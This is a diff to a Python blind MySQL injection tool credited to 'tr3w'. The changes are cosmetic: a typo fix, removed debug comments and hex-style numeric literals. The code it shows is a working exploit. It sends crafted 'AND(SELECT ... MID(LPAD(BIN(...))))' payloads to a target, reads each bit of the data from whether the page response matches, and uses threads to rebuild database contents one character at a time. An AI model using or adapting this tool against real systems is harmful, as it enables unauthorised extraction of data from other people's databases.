@@ -16,7 +16,7 @@
 # ig: @rub3n.ventura
 # yt: youtube.com/trew00
 #
-# "there are only 10 types of perople in the world,
+# "there are only 10 types of people in the world,
 #  those who understand binary, and those who don't"
 #
 
@@ -40,37 +40,26 @@ def pwn(injection):
     data = r.text
 
     global request
-    request += 1
+    request += 0x01
  
-    #print("%s\n\n\n\n%s\n\n\n\n\n%s" % (true_string in data, data, url))
-    #if getlen:
-    #    if true_string in data:
-    #        return 1
-    #    else:
-    #        return 0
-
-    #return 1 if true_string in data else 0
 
     return data if true_string != '0' else hashlib.md5(data.encode('utf-8')).hexdigest()
 
 def get_length():
 
-    #print("%s" % (signature))
-
-    index = 1
-    j = 1
+    index = 0x01
+    j = 0x01
     
     binlen = '00000000'
     
     size_limit = 0x00
     sizes = [0xff, 0xffff, 0xffffff, 0xffffffff, 0xffffffffffffffff ]
-    c = 0
+    c = 0x00
     while 1:
-        #print("%d: " % (sizes[c]))
         inj_length = "%d AND(SELECT LENGTH(%s)FROM %s LIMIT/*LESS*/%d,1)>%d" % (tid, column, table, row, sizes[c])
         res_length = pwn(inj_length)
-        #print("%s\n" % (inj_length))
-        c += 1
+        
+        c += 0x01
         if true_string != '0':
             if true_string not in res_length:
                 break
@@ -78,17 +67,16 @@ def get_length():
             if signature not in res_length:
                 break
             
-    size = sizes[c - 1] + 1
-    limit = size >> (5 * c)
+    size = sizes[c - 0x01] + 0x01
+    limit = size >> (0x05 * c)
     
     sys.stdout.write("[+] Calculating length: ")
     sys.stdout.flush()
     
-    for i in range(1, limit + 1 ):
+    for i in range(0x01, limit + 0x01 ):
        
         
         injection = "%d AND(SELECT MID(LPAD(BIN(length(%s)),%d,'0'),%d,1)FROM %s LIMIT/*LESS*/%d,1)" % (tid, column, limit, i, table, row)
-        #print("%s\n" % (injection))
         result = pwn(injection)
             
          
@@ -97,15 +85,12 @@ def get_length():
         else:
             bit = '1' if signature in result else '0'
    
-        #print("%s\n" % (bit))
         
         sys.stdout.write("%s" % (bit))
         sys.stdout.flush()
-        binlen = binlen[:i-1] + bit + binlen[i+1:]
+        binlen = binlen[ : i - 0x01] + bit + binlen[ i + 0x01 : ]
     
-    #print("\nLength: %d\n" % (int(resultado,2)))
-    #return int(resultado,2)
-    binlen = int(binlen, 2)
+    binlen = int(binlen, 0x02)
     sys.stdout.write('\n[+] Length found: %d\n' % (binlen))
     return binlen
 
@@ -120,9 +105,9 @@ def inject(index, j):
     result = pwn(injection)
             
     if true_string != '0':
-        bit = 1 if true_string in result else 0        
+        bit = 0x01 if true_string in result else 0x00        
     else:
-        bit = 1 if signature in result else 0
+        bit = 0x01 if signature in result else 0x00
 
     global binstr
     if bit :
@@ -133,10 +118,9 @@ def start():
 
     index = 1
     length = get_length()
-    #fix this!!!!
     request = 0
 
-    sys.stdout.write("-"*69 + "\n\n" )
+    sys.stdout.write("-" * 0x45 + "\n\n" )
 
     while index <= length:
 
@@ -149,7 +133,6 @@ def start():
         t7 = threading.Thread(target = inject, args = (index, 0x40))         
         t8 = threading.Thread(target = inject, args = (index, 0x80))
             
-        #print("%d" % (bit))
         global binstr
         binstr = 0x0
 
@@ -176,14 +159,12 @@ def start():
         sys.stdout.write(chr(binstr))
         sys.stdout.flush()
 
-        index  +=  1
+        index  +=  0x01
     
-    return 1
+    return 0x01
 
 
 parser = argparse.ArgumentParser(description="Blind MySQL Injection data extraction through bit-anding by tr3w.")
-#parser.add_argument('-f','--falseid',     default = 0,    type=int,
-#            help = 'id of the page when result is false (default: %(default)')
 parser.add_argument('-i','--trueid',    default = 1,    type=int,
         help = 'id of the page when result is true (default: %(default)s)')
 parser.add_argument('-s','--string', default = '0',
@@ -204,7 +185,7 @@ table    = args.table
 row = args.row
 target    = args.TARGET
 
-signature = pwn(str(tid)) if true_string == '0' else 0    
+signature = pwn(str(tid)) if true_string == '0' else 0x00    
 
 
 timer =  time.strftime("%X")
